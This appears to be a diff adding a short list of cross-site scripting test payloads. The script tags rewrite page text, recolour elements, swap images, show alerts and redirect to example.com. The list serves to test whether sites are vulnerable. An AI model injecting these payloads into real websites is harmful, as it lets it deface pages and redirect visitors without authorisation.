@@ -1,0 +1,21 @@
+xss 2.0 payloads
+
+<script>document.write("<h1>Text with  HTML or XSS alert</h1>");</script>
+
+<script>window.location.hostname</script>
+
+<script>document.querySelector('#ID-ELEMENT').textContent ='xss'</script>
+
+<script>document.getElementById('meu-elemento').textContent = 'new content';</script>
+
+<script> var novoElemento = document.createElement('p');novoElemento.textContent = 'xss';document.body.appendChild(novoElemento);</script>
+
+<script>document.getElementById('meu-elemento').style.color ='red';</script>
+
+<script>window.location.href = 'https://www.example.com';</script>
+
+<script>document.querySelector('img').src = 'nova-imagem.jpg';</script>
+
+<script>document.getElementById('my-element').classList.add('destaque');</script>
+
+<script>function minhaFuncao() { alert('Executando minha função!');}minhaFuncao();</script>
